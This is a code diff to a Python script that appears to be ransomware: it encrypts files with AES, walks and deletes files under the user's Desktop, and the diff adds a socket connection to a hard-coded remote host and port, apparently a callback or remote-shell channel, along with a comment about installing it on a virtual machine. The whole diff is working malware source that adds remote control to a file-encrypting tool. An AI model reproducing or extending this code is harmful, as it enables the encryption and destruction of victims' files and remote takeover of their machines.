@@ -5,6 +5,13 @@
 import os, glob, sys
 from Crypto.Cipher import AES
 from Crypto.Hash import SHA256 as sha
+import socket
+import subprocess
+import platform
+import getpass
+import colorama
+from colorama import Fore, Style
+from time import sleep
 
 KSIZE = 1024
 
@@ -105,6 +112,17 @@ def searchDecFile(path):
                 os.remove(filename)
             if(os.path.isdir(filename)):
                 searchDecFile(filename + '\\*')
+
+
+colorama.init(autoreset=True)
+
+#change before install on virtual machine
+RHOST = "192.168.163.1"
+RPORT = 2222
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.connect((RHOST, RPORT))
+
 
 user = os.getenv("USERNAME")
 startPath = 'C:\\Users\\' + user + '\\Desktop\\*'
